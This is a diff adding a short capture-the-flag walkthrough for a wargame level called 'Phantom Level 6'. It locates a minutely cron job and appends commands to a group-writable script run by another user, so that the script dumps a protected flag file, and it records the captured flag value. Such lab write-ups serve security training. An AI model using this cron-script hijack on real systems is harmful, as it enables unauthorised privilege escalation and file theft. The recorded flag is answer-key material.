@@ -1,0 +1,12 @@
+ [ Phantom · Level 6 ]  Scheduled Sins
+ Full brief:  cat ~/BRIEFING
+
+goal: find password for phantom7
+
+cat ~/BRIEFING: every minute scheduled job
+grep -R --line-number '^\* \* \* \* \*' /etc/cron.d /etc/crontab: * * * * * flagkeeper6 /opt/maintenance/cleanup.sh
+ls -la /opt/maintenance/cleanup.sh; cat /opt/maintenance/cleanup.sh: phantom6 (-rwsrwx--- flagkeeper6 phantom6)
+echo "echo '#cron_run' >> /opt/maintenance/cleanup.sh" >> /opt/maintenance/cleanup.sh
+echo "cat /var/lib/phantom-flags/level6_flag >> /opt/maintenance/cleanup.sh 2>/dev/null" >> /opt/maintenance/cleanup.sh
+
+sleep 70; tail -n 20 /opt/maintenance/cleanup.sh: bl_phtm6_b20566aedd42c973
